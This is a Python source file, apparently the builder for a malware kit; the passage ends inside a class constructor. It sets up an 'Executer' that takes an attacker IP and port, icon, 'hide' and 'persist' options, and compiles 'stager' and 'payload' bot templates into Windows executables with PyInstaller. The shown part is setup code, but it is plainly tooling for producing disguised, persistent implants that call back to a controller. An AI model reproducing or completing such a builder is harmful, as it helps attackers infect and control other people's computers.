#!/usr/bin/env python3

# imports
import os
import sys
import zlib
import shlex
import smtplib
import tempfile

import const 

from lib.file import File
from lib.args import Args

try:
    from PyInstaller import __main__ as pyi, is_win
except:
    print('Please install Pyinstaller: pip install pyinstaller')
    sys.exit(1)

class Executer(object):

    def __init__(self, ip, port, filename, wait, icon, hide, persist):
        self.ip = ip
        self.port = port
        self.hide = hide
        self.wait = wait
        self.binary = b''
        self.persist = persist
        self.filename = filename
        self.icon = shlex.quote(icon)

        self.output_dir = 'output'
        self.tmp_dir = tempfile.mkdtemp()
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        self.output_dir = 'output'
        self.dist_path = os.path.join(self.tmp_dir, 'application')

        # Stager
        self.stager_template = os.path.join('bot', 'template_stager.py')
        self.stager_py_temp = os.path.join('bot', filename + '.py')
        self.stager_compiled = os.path.join(self.dist_path, filename + '.exe')

        # Payload
        self.bot_template = os.path.join('bot', 'template_payload.py')

        payload_name = os.path.splitext(
            os.path.basename(const.PAYLOAD_PATH))[0]

        self.bot_py_temp = os.path.join('bot', payload_name + '.py')
        self.bot_compiled = os.path.join(
            self.dist_path,  payload_name + '.exe')